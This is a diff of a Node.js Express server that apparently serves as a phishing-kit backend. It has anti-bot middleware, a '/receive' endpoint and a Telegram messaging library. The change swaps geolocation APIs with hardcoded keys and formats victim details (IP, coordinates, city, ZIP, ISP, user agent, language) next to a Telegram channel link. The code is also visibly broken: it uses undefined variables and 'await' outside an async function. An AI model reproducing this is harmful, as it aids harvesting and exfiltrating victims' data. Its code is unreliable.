@@ -7,7 +7,8 @@ const antibot = require('./middleware/antibot');
 const ipRangeCheck = require('ip-range-check');
 const requestIP = require('request-ip');
 const axios = require('axios');
-const abstractApiKey = '72afc8e739e6478d9202565f05968721';
+const ApiKey = 'bdc_4422bb94409c46e986818d3e9f3b2bc2';
+const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
 const { getClientIp } = require('request-ip');
 const { sendMessageFor } = require('simple-telegram-message');
 let IpAddress;
@@ -38,12 +39,21 @@ app.post('/receive', (req, res) => {
     let addup = '';
 
     try {
-        const response = await axios.get(`https://ipgeolocation.abstractapi.com/v1/?api_key=${abstractApiKey}&ip_address=${ipAddress}`);
+        const response = await axios.get(URL + ipAddress + '&localityLanguage=en&key=' + ApiKey);
         const data = response.data;
 
-        addup += `IP Address: ${data.ip_address}\n`;
-        addup += `City: ${data.city}\n`;
-        // Add other relevant information as needed
+        addup += `IP ADDRESS       : ${ipAddressInformation.ip}\n` +
+        `COORDINATES      : ${ipAddressInformation.location.longitude}, ${ipAddressInformation.location.latitude}\n` +  // Fix variable names
+        `CITY             : ${ipAddressInformation.location.city}\n` +
+        `STATE            : ${ipAddressInformation.location.principalSubdivision}\n` +
+        `ZIP CODE         : ${ipAddressInformation.location.postcode}\n` +
+        `COUNTRY          : ${ipAddressInformation.country.name}\n` +
+		`TIME             : ${ipAddressInformation.location.timeZone.localTime}\n` +
+		`ISP              : ${ipAddressInformation.network.organisation}\n\n` +
+        `💻 SYSTEM INFO\n` +
+        `USER AGENT       : ${userAgent}\n` +
+        `SYSTEM LANGUAGE  : ${systemLang}\n` +
+        `💬 Telegram: https://t.me/UpdateTeams\n`;
 
         res.send(message);
     } catch (error) {
